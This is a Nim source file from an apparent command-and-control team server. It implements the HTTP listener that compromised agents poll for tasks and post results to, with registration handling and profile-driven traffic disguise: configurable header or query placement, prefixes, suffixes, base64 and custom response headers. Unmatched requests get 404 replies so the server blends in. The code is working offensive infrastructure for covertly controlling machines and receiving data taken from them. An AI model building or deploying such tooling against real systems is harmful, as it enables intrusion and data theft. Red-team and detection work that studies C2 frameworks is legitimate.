import mummy, terminal, strformat, parsetoml, tables
import strutils, base64

import ./handlers
import ../globals
import ../core/[logger, websocket]
import ../../common/[types, utils, serialize, profile]

# Not Found
proc error404*(request: Request) =  
    request.respond(404, body = "")

# Method not allowed 
proc error405*(request: Request) = 
    request.respond(404, body = "") 

# Utils 
proc hasKey(headers: seq[(string, string)], headerName: string): bool =
    for (name, value) in headers:
        if name.toLower() == headerName.toLower():
            return true
    return false

proc get(headers: seq[(string, string)], headerName: string): string =
    for (name, value) in headers:
        if name.toLower() == headerName.toLower():
            return value
    return ""

#[
    GET
    Called from agent to check for new tasks
]#
proc httpGet*(request: Request) = 
    {.cast(gcsafe).}:

        # Check heartbeat metadata placement
        var heartbeat: seq[byte]
        var heartbeatString: string

        case cq.profile.getString("http-get.agent.heartbeat.placement.type"): 
        of "header": 
            let heartbeatHeader = cq.profile.getString("http-get.agent.heartbeat.placement.name")
            if not request.headers.hasKey(heartbeatHeader): 
                request.respond(404, body = "")
                return
            heartbeatString = request.headers.get(heartbeatHeader)

        of "query": 
            let param = cq.profile.getString("http-get.agent.heartbeat.placement.name")
            heartbeatString = request.queryParams.get(param)  
            if heartbeatString.len <= 0: 
                request.respond(404, body = "")
                return

        of "uri": 
            discard 
        of "body": 
            discard
        else: discard 

        # Retrieve and apply data transformation to get raw heartbeat packet
        let 
            prefix = cq.profile.getString("http-get.agent.heartbeat.prefix")
            suffix = cq.profile.getString("http-get.agent.heartbeat.suffix")
            encHeartbeat = heartbeatString[len(prefix) ..^ len(suffix) + 1]

        case cq.profile.getString("http-get.agent.heartbeat.encoding.type", default = "none"): 
        of "base64":
            heartbeat = string.toBytes(decode(encHeartbeat)) 
        of "none":
            heartbeat = string.toBytes(encHeartbeat) 

        try: 
            var responseBytes: seq[byte]
            let (agentId, tasks) = getTasks(heartbeat)

            if tasks.len <= 0: 
                request.respond(200, body = "")
                return

            # Create response, containing number of tasks, as well as length and content of each task
            # This makes it easier for the agent to parse the tasks
            responseBytes.add(cast[uint8](tasks.len))

            for task in tasks:
                responseBytes.add(uint32.toBytes(uint32(task.len))) 
                responseBytes.add(task)
            
            # Apply data transformation to the response
            var response: string
            case cq.profile.getString("http-get.server.output.encoding.type", default = "none"): 
            of "none": 
                response = Bytes.toString(responseBytes)
            of "base64":
                response = encode(responseBytes, safe = cq.profile.getBool("http-get.server.output.encoding.url-safe"))
            else: discard

            let prefix = cq.profile.getString("http-get.server.output.prefix")
            let suffix = cq.profile.getString("http-get.server.output.suffix")

            # Add headers, as defined in the team server profile 
            var headers: HttpHeaders
            for header, value in cq.profile.getTable("http-get.server.headers"):
                headers.add((header, value.getStringValue()))

            request.respond(200, headers = headers, body = prefix & response & suffix)

            # Notify operator that agent collected tasks
            cq.client.sendConsoleItem(agentId, LOG_INFO, fmt"{$response.len} bytes sent.")
            cq.info(fmt"{$response.len} bytes sent.")

        except CatchableError as err:
            request.respond(404, body = "")

#[
    POST 
    Called from agent to register itself or post results of a task
]#
proc httpPost*(request: Request) = 
    {.cast(gcsafe).}:

        try:        
            # Retrieve data from the request
            var dataString: string
            var data: seq[byte]
            
            case cq.profile.getString("http-post.agent.output.placement.type"): 
            of "header": 
                let dataHeader = cq.profile.getString("http-post.agent.output.placement.name")
                if not request.headers.hasKey(dataHeader): 
                    request.respond(400, body = "")
                    return
                dataString = request.headers.get(dataHeader)

            of "query": 
                let param = cq.profile.getString("http-post.agent.output.placement.name")
                dataString = request.queryParams.get(param)  
                if dataString.len <= 0: 
                    request.respond(400, body = "")
                    return

            of "uri": 
                discard 

            of "body": 
                dataString = request.body

            else: discard 

            # Retrieve and reverse data transformation
            let 
                prefix = cq.profile.getString("http-post.agent.output.prefix")
                suffix = cq.profile.getString("http-post.agent.output.suffix")
                encData = dataString[len(prefix) ..^ len(suffix) + 1]

            case cq.profile.getString("http-post.agent.output.encoding.type", default = "none"): 
            of "base64":
                data = string.toBytes(decode(encData)) 
            of "none":
                data = string.toBytes(encData) 

            # Add response headers, as defined in team server profile
            var headers: HttpHeaders
            for header, value in cq.profile.getTable("http-post.server.headers"):
                headers.add((header, value.getStringValue()))

            # Differentiate between registration and task result packet
            var unpacker = Unpacker.init(Bytes.toString(data))
            let header = unpacker.deserializeHeader()
            if cast[PacketType](header.packetType) == MSG_REGISTER: 
                if not register(data, request.remoteAddress):
                    request.respond(400, body = "")
                    return

            elif cast[PacketType](header.packetType) == MSG_RESULT: 
                handleResult(data)

            request.respond(200, body = cq.profile.getString("http-post.server.output.body"))

        except CatchableError:
            request.respond(404, body = "")

        return